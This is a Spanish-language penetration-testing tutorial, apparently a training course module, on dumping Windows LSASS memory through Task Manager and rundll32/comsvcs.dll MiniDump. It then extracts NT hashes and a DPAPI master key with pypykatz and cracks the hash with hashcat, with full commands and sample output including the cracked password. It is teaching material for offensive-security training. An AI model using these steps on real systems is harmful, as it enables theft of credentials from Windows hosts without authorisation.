# Attacking LSASS

De forma similar al proceso de atacar la base de datos SAM, con LSASS, sería prudente primero crear una copia del contenido de la memoria del proceso LSASS a través de la generación de un volcado de memoria. Crear un archivo de volcado nos permite extraer credenciales de forma offline utilizando nuestro host de ataque. Teniendo en cuenta que llevar a cabo ataques offline nos da mayor flexibilidad en la velocidad del ataque y requiere menos tiempo en el sistema objetivo. Existen innumerables métodos que podemos usar para crear un volcado de memoria. Cubramos algunas técnicas que se pueden realizar usando herramientas ya integradas en Windows.

<figure><img src="../../.gitbook/assets/image (703).png" alt=""><figcaption></figcaption></figure>

### Método del Administrador de Tareas

Con acceso a una sesión gráfica interactiva en el objetivo, podemos usar el Administrador de Tareas para crear un volcado de memoria. Esto requiere que:

<figure><img src="../../.gitbook/assets/image (704).png" alt=""><figcaption></figcaption></figure>

**Pasos:**

1. Abrir el Administrador de Tareas.
2. Seleccionar la pestaña de _Procesos_.
3. Buscar y hacer clic derecho en el proceso **Local Security Authority Process (lsass.exe)**.
4. Seleccionar _Crear archivo de volcado_.

Se creará un archivo llamado `lsass.DMP` y se guardará en:

`C:\Users\nombredelusuario\AppData\Local\Temp`

Este es el archivo que transferiremos a nuestro host de ataque. Podemos usar el método de transferencia de archivos discutido en la sección de ataque a SAM para transferir el archivo de volcado a nuestro host de ataque.

### Método con Rundll32.exe y Comsvcs.dll

El método del Administrador de Tareas depende de que tengamos una sesión interactiva basada en GUI en el objetivo. Podemos utilizar un método alternativo para volcar la memoria del proceso LSASS a través de una utilidad de línea de comandos llamada **rundll32.exe**. Este método es más rápido que el del Administrador de Tareas y más flexible, ya que podemos obtener una sesión de shell en un host de Windows con solo acceso a la línea de comandos. Es importante tener en cuenta que las herramientas antivirus modernas reconocen este método como actividad maliciosa.

**Pasos:**

1. Antes de emitir el comando para crear el archivo de volcado, debemos determinar qué **ID de proceso (PID)** está asignado a `lsass.exe`. Esto se puede hacer desde `cmd` o `PowerShell`:

### Encontrar el PID de LSASS en `cmd`

Desde `cmd`, podemos emitir el comando:

```bash
tasklist /svc
```

y encontrar `lsass.exe` y su ID de proceso en el campo PID.

```plaintext
C:\Windows\system32> tasklist /svc

Nombre de imagen                 PID Servicios
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
Registry                        96 N/A
smss.exe                       344 N/A
csrss.exe                      432 N/A
wininit.exe                    508 N/A
csrss.exe                      520 N/A
winlogon.exe                   580 N/A
services.exe                   652 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 PlugPlay
svchost.exe                    804 BrokerInfrastructure, DcomLaunch, Power,
                                   SystemEventsBroker
fontdrvhost.exe                812 N/A
```

### Encontrar el PID de LSASS en PowerShell

Desde PowerShell, podemos emitir el comando:

```powershell
Get-Process lsass
```

y ver el ID de proceso en el campo `Id`.

```plaintext
PS C:\Windows\system32> Get-Process lsass

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   1260      21     4948      15396       2.56    672   0 lsass
```

Una vez que tengamos el **PID** asignado al proceso LSASS, podemos crear el archivo de volcado.

### Creando `lsass.dmp` usando PowerShell

Con una sesión de PowerShell elevada, podemos emitir el siguiente comando para crear el archivo de volcado:

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

Con este comando, ejecutamos **rundll32.exe** para llamar a una función exportada de **comsvcs.dll**, que a su vez llama a la función **MiniDumpWriteDump** (MiniDump) para volcar la memoria del proceso LSASS en un directorio especificado (en este caso, `C:\lsass.dmp`). Es importante recordar que la mayoría de las herramientas antivirus modernas reconocen esto como actividad maliciosa y previenen la ejecución del comando. En estos casos, debemos considerar formas de evitar o desactivar el antivirus. Las técnicas para evadir antivirus están fuera del alcance de este módulo.

Si logramos ejecutar este comando y generar el archivo `lsass.dmp`, podemos proceder a transferir el archivo a nuestra máquina de ataque para intentar extraer cualquier credencial que pueda haber estado almacenada en la memoria del proceso LSASS.

> **Nota:** Podemos usar el método de transferencia de archivos discutido en la sección de ataque a SAM para obtener el archivo `lsass.dmp` del objetivo a nuestro host de ataque.

### Usando Pypykatz para Extraer Credenciales

Una vez que tengamos el archivo de volcado en nuestro host de ataque, podemos utilizar una poderosa herramienta llamada **Pypykatz** para intentar extraer credenciales del archivo `.dmp`. Pypykatz es una implementación de **Mimikatz** escrita completamente en Python. El hecho de que esté escrita en Python nos permite ejecutarla en hosts de ataque basados en Linux. En el momento de escribir este módulo, Mimikatz solo funciona en sistemas Windows, por lo que para usarlo, tendríamos que utilizar un host de ataque basado en Windows o ejecutarlo directamente en el objetivo, lo cual no es un escenario ideal. Esto hace que Pypykatz sea una alternativa atractiva, ya que solo necesitamos una copia del archivo de volcado, y podemos ejecutarlo offline desde nuestro host de ataque basado en Linux.

LSASS almacena credenciales de sesiones activas de inicio de sesión en sistemas Windows. Al volcar la memoria del proceso LSASS en un archivo, esencialmente tomamos una "instantánea" de lo que estaba en la memoria en ese momento. Si había sesiones activas, las credenciales utilizadas para establecerlas estarán presentes. Vamos a ejecutar Pypykatz contra el archivo de volcado y ver qué encontramos.

### **Ejecutando Pypykatz**

El comando para iniciar Pypykatz y analizar los secretos ocultos en el volcado de memoria de LSASS es el siguiente. Usamos `lsa` en el comando porque LSASS es un subsistema de la autoridad de seguridad local, luego especificamos la fuente de datos como un archivo de minidump, seguido por la ruta del archivo de volcado (`/home/peter/Documents/lsass.dmp`) almacenado en nuestro host de ataque.

```bash
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

Pypykatz analiza el archivo de volcado y muestra los resultados:

```plaintext
INFO:root:Parsing file /home/peter/Documents/lsass.dmp
FILE: ======== /home/peter/Documents/lsass.dmp =======
== LogonSession ==
authentication_id 1354633 (14ab89)
session_id 2
username bob
domainname DESKTOP-33E7O54
logon_server WIN-6T0C3J2V6HP
logon_time 2021-12-14T18:14:25.514306+00:00
sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
	== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
		password (hex)
	== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
	== DPAPI [14ab89]==
		luid 1354633
		key_guid 3e1d1091-b792-45df-ab8e-c66af044d69b
		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92
		sha1_masterkey 52e758b6120389898f7fae553ac8172b43221605
```

### Información Útil en la Salida de Pypykatz

**MSV**

El **MSV** es un paquete de autenticación en Windows que LSA llama para validar intentos de inicio de sesión contra la base de datos SAM. Pypykatz extrae el **SID**, **nombre de usuario**, **dominio**, y los **hashes de contraseña NT y SHA1** asociados con la sesión de inicio de sesión del usuario `bob` almacenada en la memoria del proceso LSASS.

```plaintext
== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
```

### **WDIGEST**

**WDIGEST** es un protocolo de autenticación más antiguo, habilitado por defecto en Windows XP - Windows 8 y Windows Server 2003 - Windows Server 2012. LSASS almacena las credenciales usadas por WDIGEST en texto plano, lo que significa que, si encontramos un sistema con WDIGEST habilitado, probablemente veremos una contraseña en texto claro.

```plaintext
== WDIGEST [14ab89]==
		username bob
		domainname DESKTOP-33E7O54
		password None
```

### **Kerberos**

**Kerberos** es un protocolo de autenticación en red usado por **Active Directory** en entornos de dominio de Windows. Las cuentas de usuario del dominio obtienen tickets tras autenticarse con Active Directory, que luego se utilizan para acceder a recursos compartidos en la red sin tener que ingresar las credenciales cada vez. LSASS almacena contraseñas, claves, tickets y pines asociados con Kerberos.

```plaintext
== Kerberos ==
		Username: bob
		Domain: DESKTOP-33E7O54
```

### DPAPI

La **Interfaz de Programación de Aplicaciones para la Protección de Datos** o **DPAPI** es un conjunto de APIs en sistemas operativos Windows utilizadas para cifrar y descifrar blobs de datos DPAPI de forma individual por usuario, para características del sistema operativo Windows y varias aplicaciones de terceros. A continuación, algunos ejemplos de aplicaciones que usan DPAPI y lo que protegen con ella:

| **Aplicaciones**              | **Uso de DPAPI**                                                                                              |
| ----------------------------- | ------------------------------------------------------------------------------------------------------------- |
| **Internet Explorer**         | Datos de autocompletado de formularios de contraseñas (nombre de usuario y contraseña para sitios guardados). |
| **Google Chrome**             | Datos de autocompletado de formularios de contraseñas (nombre de usuario y contraseña para sitios guardados). |
| **Outlook**                   | Contraseñas de cuentas de correo electrónico.                                                                 |
| **Remote Desktop Connection** | Credenciales guardadas para conexiones a máquinas remotas.                                                    |
| **Credential Manager**        | Credenciales guardadas para acceder a recursos compartidos, unirse a redes inalámbricas, VPNs, etc.           |

**Mimikatz** y **Pypykatz** pueden extraer la **clave maestra DPAPI** del usuario que inició sesión y cuyos datos están presentes en la memoria del proceso LSASS. Esta clave maestra puede usarse para descifrar los secretos asociados con cada una de las aplicaciones que usan DPAPI, lo que permite capturar credenciales de diversas cuentas. Las técnicas de ataque DPAPI se cubren con mayor detalle en el módulo de **Escalada de Privilegios en Windows**.

### **Cracking del NT Hash con Hashcat**

Ahora podemos usar **Hashcat** para crackear el **NT Hash**. En este ejemplo, solo encontramos un hash NT asociado con el usuario Bob, lo que significa que no necesitamos crear una lista de hashes como lo hicimos en la sección de ataque a SAM de este módulo. Después de establecer el modo en el comando, podemos pegar el hash, especificar una lista de palabras, y luego intentar crackear el hash.

```bash
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

El intento de crackeo fue exitoso:

```plaintext
64f12cddaa88057e06a81b54e73b949b:Password1
```

Con esto, nuestro ataque se puede considerar un éxito.
